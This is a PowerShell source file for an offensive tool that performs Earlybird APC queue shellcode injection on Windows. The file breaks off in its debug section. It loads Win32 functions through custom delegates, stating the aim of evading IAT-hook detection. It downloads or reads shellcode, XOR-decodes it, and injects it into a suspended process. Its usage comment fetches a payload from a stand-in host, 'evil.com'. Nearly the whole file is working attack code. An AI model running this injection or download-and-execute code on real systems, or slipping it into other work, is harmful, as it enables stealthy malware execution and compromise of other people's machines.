function Earlybird-Inject {
#.SYNOPSIS
# Standalone PowerShell Script for Earlybird APC Queue Injection (via delegates)
# Arbitrary Version Number: v1.0.0
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# This tool does not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates to
# wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
# Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
# allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
#
# Windows API Call(s) Utilized:
#  |__ CreateProcessA()
#  |__ VirtualAllocEx()
#  |__ WriteProcessMemory()
#  |__ VirtualProtectEx()
#  |__ QueueUserAPC()
#  |__ ResumeThread()    
#
# Struct(s) Utilized:
#  |__ STARTUPINFOA
#  |__ PROCESS_INFORMATION
#  |__ SECURITY_ATTRIBUTES
#
# Parameters:
#   -Shellcode      -->  Shellcode to execute (can be a byte array, string, filepath, or URI).
#   -XorKey         -->  XOR cipher key for the shellcode (max value: 0xFF).
#   -CreateProcess  -->  Process to create and inject with shellcode.
#   -ProcessArgs    -->  Pass fake arguments to the created process.
#   -UseProxy       -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
#   -Debug          -->  Pause execution and shellcode memory address for process attachment.
#   -Help           -->  Return Get-Help information.
#
# Example Usage:
#  __________________________________________________________________________________________________________
# |                                                                                                          |
# | # Earlybird inject 'notepad.exe' and pause execution to attach with a debugger                           |
# | PS> Earlybird-Inject -Shellcode ./calc64.bin -CreateProcess 'notepad' -Debug                             |
# |                                                                                                          |
# | # Earlybird inject 'runtimebroker.exe' with spoofed process arguments                                    |
# | PS> Earlybird-Inject -Shellcode ./msgbox64.bin -CreateProcess 'runtimebroker' -ProcessArgs '-Embedding'  |
# |                                                                                                          |
# | # Earlybird inject 'calc.exe' with XOR encrypted shellcode downloaded from a URI                         |
# | PS> Earlybird-Inject -Shellcode 'https://evil.com/bin' -XorKey 0x69 -CreateProcess 'calc'                |
# |__________________________________________________________________________________________________________|
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS

    Param(
        $Shellcode, # Intentionally vague type for maximum compatibility
        [UInt32]$XorKey,
        [string]$CreateProcess,
        [string]$ProcessArgs,
        [switch]$UseProxy,
        [switch]$Debug,
        [switch]$Help
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Earlybird-Inject) }


    # Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }
    if (!$CreateProcess) { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
    if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
        return (Write-Host "[!] Error! Unable to locate process '${CreateProcess}'." -ForegroundColor Red)
    }


    # Internal Function(s)
    function Format-ByteArray ($Shellcode, [UInt32]$XorKey, [Bool]$UseProxy) {

        # Function Description   : PowerShell Script (mini version) to Convert Multi-Language Shellcode Strings into Byte Arrays
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Format-ByteArray.ps1

        Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow

        if ($Shellcode -is [array]) {
            if ($Shellcode -is [Byte[]]) {
                Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            else {
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }

        if ($Shellcode -is [uri]) {
            Write-Host ' o  Shellcode parameter is a [uri].'
            Write-Host " o  --> URI : $($Shellcode.AbsoluteUri)"
            Write-Host ' o  --> Downloading data...'
            Try {
                if ($UseProxy) {
                    $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode.AbsoulteUri)
                    $WebClient = [System.Net.WebClient]::new()
                    $Proxy     = [System.Net.WebProxy]::new()
                    $Proxy.Address = $LinkProxy.AbsoluteUri
                    $Proxy.UseDefaultCredentials = $TRUE
                    $WebClient.Proxy = $Proxy
                    $ShellcodeBuffer = $WebClient.DownloadData($Shellcode.AbsoluteUri)
                }
                else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode.AbsoluteUri) }
            }
            Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
        }

        if ($Shellcode -is [String]) {
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')
            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                Write-Host ' o  Shellcode [string] is a path to a file.'
                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }
            elseif ($Shellcode -match "^(http://|https://)") {
                Write-Host ' o  Shellcode [string] is a URI.'
                Write-Host " o  --> URI : $Shellcode"
                Write-Host ' o  --> Downloading data...'
                Try {
                    if ($UseProxy) {
                        $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode)
                        $WebClient = [System.Net.WebClient]::new()
                        $Proxy     = [System.Net.WebProxy]::new()
                        $Proxy.Address = $LinkProxy.AbsoluteUri
                        $Proxy.UseDefaultCredentials = $TRUE
                        $WebClient.Proxy = $Proxy
                        $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
                    }
                    else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode) }
                } 
                Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
            }
            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }
            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }
            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }

        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        
        if ($XorKey) {
            Write-Host '[!] Applying XOR Cipher to Shellcode:' -ForegroundColor Yellow
            Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"
            for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
                $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
            }
        }

        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        # Function Description   : PowerShell Script (mini version) to Load Win32 Functions into Session via Function Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1

        Try {
            if ($PSVersionTable.PSEdition -eq 'Core') {
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
                $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch { return Generic-Error }
         
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            Try {
                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
                $FunctionDelegate   = $TypeBuilder.CreateType()
            }
            Catch { return Generic-Error }
        }

        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1

        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) { return $CustomType }
        }

        Try {
            $DynAssembly     = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
            $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
            $Attributes      = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder     = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
            foreach ($Member in $MembersObject) { [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public') }
            return $TypeBuilder.CreateType()
        }
        Catch { return Generic-Error }
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }
    function Win32-Error() {
        return (Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
    }
    function Print-Hex ($Integer) {
        return ('0x{0:x}' -f $Integer)
    }


    ### Define Required Constant(s) ###
    
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
    $AccessRights = @{
        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
        PROCESS_CREATE_PROCESS    = 0x0080;
        PROCESS_CREATE_THREAD     = 0x0002;
        PROCESS_QUERY_INFORMATION = 0x0400;
        PROCESS_VM_OPERATION      = 0x0008;
        PROCESS_VM_READ           = 0x0010;
        PROCESS_VM_WRITE          = 0x0020;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    $MemoryAllocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    $MemoryProtection = @{
        PAGE_EXECUTE           = 0x10;
        PAGE_EXECUTE_READ      = 0x20;
        PAGE_READWRITE         = 0x04;
        PAGE_EXECUTE_READWRITE = 0x40;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
    $ProcessCreation = @{
        CREATE_SUSPENDED             = 0x00000004; # used
        CREATE_NO_WINDOWS            = 0x08000000;
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StartupFlags = @{
        STARTF_USESTDHANDLES = 0x00000100;
        STARTF_USESHOWWINDOW = 0x00000001;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
    $ProcAttrFlags = @{
        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000; # used
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000;
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
    $ThreadAccess = @{
        THREAD_SET_CONTEXT = 0x0010;
    }


    ### Define Required Struct(s) ###

    # STARTUPINFOA | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'cb'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpReserved'      ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpDesktop'       ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpTitle'         ; Type = [String] },
        [PSCustomObject]@{ Name = 'dwX'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwY'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFillAttribute' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFlags'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'wShowWindow'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'cbReserved2'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'lpReserved2'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdInput'       ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdOutput'      ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdError'       ; Type = [IntPtr] }
    )
    $StartupInfoType    = Build-Win32Struct -StructName "STARTUPINFOA" -MembersObject $StructMembers
    $StartupInfoTypeRef = $StartupInfoType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfo        = [STARTUPINFOA]::new()            # Used for Win32 function parameter(s)

    # STARTUPINFOEXA | https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'StartupInfo'     ; Type = $StartupInfoType },
        [PSCustomObject]@{ Name = 'lpAttributeList' ; Type = [IntPtr] }
    )
    $StartupInfoExType    = Build-Win32Struct -StructName "STARTUPINFOEXA" -MembersObject $StructMembers
    $StartupInfoExTypeRef = $StartupInfoExType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfoEx        = [STARTUPINFOEXA]::new()            # Used for Win32 function parameter(s)
    
    # PROCESS_INFORMATION | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'hProcess'    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hThread'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'dwProcessId' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwThreadId'  ; Type = [Int32]  }
    )
    $ProcessInformationType    = Build-Win32Struct -StructName "PROCESS_INFORMATION" -MembersObject $StructMembers
    $ProcessInformationTypeRef = $ProcessInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessInformation        = [PROCESS_INFORMATION]::new()            # Used for Win32 function parameter(s)

    # PROCESS_BASIC_INFORMATION | https://ntdoc.m417z.com/process_basic_information, https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'ExitStatus'                   ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'PebAddress'                   ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'AffinityMask'                 ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'BasePriority'                 ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'UniquePID'                    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'InheritedFromUniqueProcessId' ; Type = [IntPtr] }
    )
    $ProcessBasicInformationType    = Build-Win32Struct -StructName "PROCESS_BASIC_INFORMATION" -MembersObject $StructMembers
    $ProcessBasicInformationTypeRef = $ProcessBasicInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessBasicInformation        = [PROCESS_BASIC_INFORMATION]::new()           # Used for Win32 function parameter(s)

    # SECURITY_ATTRIBUTES | https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'nLength'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpSecurityDescriptor' ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'bInheritHandle'       ; Type = [Bool]   }
    )
    $SecurityAttributesType    = Build-Win32Struct -StructName "SECURITY_ATTRIBUTES" -MembersObject $StructMembers
    $SecurityAttributesTypeRef = $SecurityAttributesType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessAttributes         = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 1
    $ThreadAttributes          = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 2


    ### Load Required Win32 API Call(s) ### 
    
    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow

    # Earlybird APC Queue Injection
    #  |__ CreateProcess()
    #  |__ VirtualAllocEx()
    #  |__ WriteProcessMemory()
    #  |__ VirtualProtectEx()
    #  |__ QueueUserAPC()
    #  |__ ResumeThread()

    Try {
        $CreateProcArgs = @(
            [String],                   #lpApplicationName
            [String],                   #lpCommandLine
            $SecurityAttributesTypeRef, #lpProcessAttributes
            $SecurityAttributesTypeRef, #lpThreadAttributes
            [Bool],                     #bInheritHandles
            [Int32],                    #dwCreationFlags
            [IntPtr],                   #lpEnvironment
            [String],                   #lpCurrentDirectory
            $StartupInfoTypeRef,        #lpStartupInfo
            $ProcessInformationTypeRef  #lpProcessInformation
        )
        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])

        $VirtualAllocExArgs = @(
            [IntPtr], # hProcess
            [IntPtr], # lpAddress
            [UInt32], # dwSize
            [UInt32], # flAllocationType
            [UInt32]  # flProtect
        )
        $VirtualAllocEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualAllocEx" -ParamTypes $VirtualAllocExArgs -ReturnType ([IntPtr])

        $WriteProcMemArgs = @(
            [IntPtr],                # hProcess
            [IntPtr],                # lpBaseAddress
            [byte[]],                # lpBuffer
            [UInt32],                # nSize
            [UInt32].MakeByRefType() # lpNumberOfBytesWritten
        )
        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool])

        $VirtProtectExArgs = @(
            [IntPtr],                 #hProcess
            [IntPtr],                 #lpAddress
            [UInt32],                 # dwSize
            [UInt32],                 # flNewProtect
            [UInt32].MakeByRefType()  # lpflOldProtect
        )
        $VirtualProtectEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtectEx" -ParamTypes $VirtProtectExArgs -ReturnType ([Bool])

        $QueueUserArgs = @(
            [IntPtr], # pfnAPC
            [IntPtr], # hThread
            [IntPtr]  # dwData
        )
        $QueueUserAPC =  Load-Win32Function -Library "Kernel32.dll" -FunctionName "QueueUserAPC" -ParamTypes $QueueUserArgs -ReturnType ([IntPtr])

        $ResThreadArgs = @(
            [IntPtr] # hThread
        )
        $ResumeThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ResumeThread" -ParamTypes $ResThreadArgs -ReturnType ([UInt32])

        # Sanity Check
        $Win32Funcs = @('CreateProcessA','VirtualAllocEx','WriteProcessMemory','VirtualProtectEx','QueueUserAPC','ResumeThread')
        $Win32Funcs | % { if ((Get-Variable -Name $_ -ValueOnly 2>$NULL) -isnot [Delegate]) { 
                return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red)
            }
        }
    }
    Catch { return Generic-Error }


    ### Initialize Key Variables ###

    # Parameter Processing
    if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
    else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }

    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
    if ($ShellcodeBuffer -isnot [byte[]]) { return }


    ### (1) Create Target Process in a Suspended State ###

    Write-Host "[!] Creating target process..." -ForegroundColor Yellow

    # CreateProcessA()
    #  > Description : Create a new process and its primary thread.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

    # Argument(s)
    $lpApplicationName    = $CreateProcess                            # Full path of the application to be executed.
    $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"         # Command line arguments to be executed  (full path + optional arguments).
    $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
    $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
    $bInheritHandles      = $False                                    # Boolean for new process to inherit handles from calling process.  
    $dwCreationFlags      = $ProcessCreation.CREATE_SUSPENDED         # New process creation flags (i.e., create in suspended state).
    $lpEnvironment        = [IntPtr]::Zero                            # Pointer to the environment block for the new process.
    $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # Full path to the current directory for the process.
    $lpStartupInfo        = [ref]$StartupInfo                         # Pointer to STARTUPINFOA struct.
    $lpProcessInformation = [ref]$ProcessInformation                  # Pointer to PROCESS_INFORMATION struct.

    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green

    Try   { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
    Catch { return Generic-Error }

    if (!$Success) { return Win32-Error }
    $RetProcessInformation = $lpProcessInformation.Value
    Write-Host " o  --> Process Path : ${CreateProcess}"
    Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"


    ### (2) Allocate memory within Target Process ###

    Write-Host "[!] Allocating memory within '$($Createprocess.Split('\')[-1])' ($($RetProcessInformation.dwProcessId))..." -ForegroundColor Yellow

    # VirtualAllocEx()
    #  > Definition : Allocates memory within an external process and returns a pointer to said space.
    #  > Location   : Kernel32.dll
    #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    
    # Argument(s)
    $hProcess         = $RetProcessInformation.hProcess                                 # Handle to the target process.             
    $lpAddress        = [IntPtr]::Zero                                                  # Starting address in memory to allocate.        
    $dwSize           = $shellcodeBuffer.Length                                         # Size of the memory allocation in bytes.      
    $flAllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE # Flags for memory allocation type.
    $flProtect        = $MemoryProtection.PAGE_READWRITE                                # Memory protection flags for the allocated region.

    Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green

    Try   { $ShellcodeAddr = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
    Catch { return Generic-Error }

    if ($ShellcodeAddr -eq 0) { return Win32-Error }
    Write-Host " o  --> Allocated Memory Address : $(Print-Hex $ShellcodeAddr)"
    Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"
    Write-Host " o  --> Memory Protection        : 0x04 (PAGE_READWRITE)"


    ### (3) Write memory to allocated space

    Write-Host "[!] Writing buffer to allocated memory..." -ForegroundColor Yellow

    # WriteProcessMemory()
    #  > Definition : Write data to an area of memory within a specified process.
    #  > Location   : Kernel32.dll
    #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

    # Argument(s)
    $hProcess               = $RetProcessInformation.hProcess # Handle to the target process.
    $lpBaseAddress          = $ShellcodeAddr                  # Pointer to the starting address in memory to allocate. 
    $lpBuffer               = $shellcodeBuffer                # Buffer of bytes to copy/write.                
    $nSize                  = $shellcodeBuffer.Length         # Size of the buffer to copy.                      
    $lpNumberOfBytesWritten = 0                               # Output variable to receive number of bytes written.
    
    Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green

    Try   { $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
    Catch { return Generic-Error }

    if (!$MemoryCopied) { return Win32-Error }
    Write-Host " o  --> Successful wrote shellcode buffer."


    ### (3) Make Memory Buffer Executable ###

    Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow

    # VirtualProtectEx()
    #  > Definition  :  Changes the protection of a region of memory within a specified process.
    #  > Location    :  Kernel32.dll
    #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

    # Argument(s)
    $hProcess       = $RetProcessInformation.hProcess     # Handle to the target process.   
    $lpAddress      = $ShellcodeAddr                      # Pointer to the starting address in memory to change.
    $dwSize         = $ShellcodeBuffer.Length             # Size of the target memory buffer in bytes.
    $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ # Memory protection flags for the specified region.
    $lpflOldProtect = 0                                   # Output variable to receive old memory protection flags.

    Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtectEx()' -ForegroundColor Green

    Try   { $Success = $VirtualProtectEx.Invoke($hProcess, $lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
    Catch { return Generic-Error }

    if (!$Success) { return Win32-Error }
    Write-Host ' o  --> Memory Protection : 0x20 (PAGE_EXECUTE_READ)'


    ### (4) Queue Shellcode Thread via APC ###

    Write-Host '[!] Queueing thread via APC...' -ForegroundColor Yellow

    # QueueUserAPC()
    #  > Definition  :  Adds a user-mode APC object to the APC queue of a specified thread.
    #  > Location    :  Kernel32.dll
    #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

    # Argument(s)
    $pfnAPC       = $ShellcodeAddr                  # Pointer to APC function to be called (i.e., shellcode).
    $hThread      = $RetProcessInformation.hThread  # Handle to the target thread.
    $dwData       = [IntPtr]::Zero                  # Value passed to the APC function.
    
    Write-Host ' o  ' -NoNewline; Write-Host 'QueueUserAPC()' -ForegroundColor Green

    Try   { $Return = $QueueUserAPC.Invoke($pfnAPC, $hThread, $dwData) }
    Catch { return Generic-Error }
    
    if ($Return -eq 0) { return Win32-Error }
    Write-Host ' o  --> Successfully added APC queue.'


    ### Optional: Debug Mode to Attach to Process ###

    if ($Debug) {
        
        $TargetProcess = Get-Process -Id $RetProcessInformation.dwProcessId

        Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
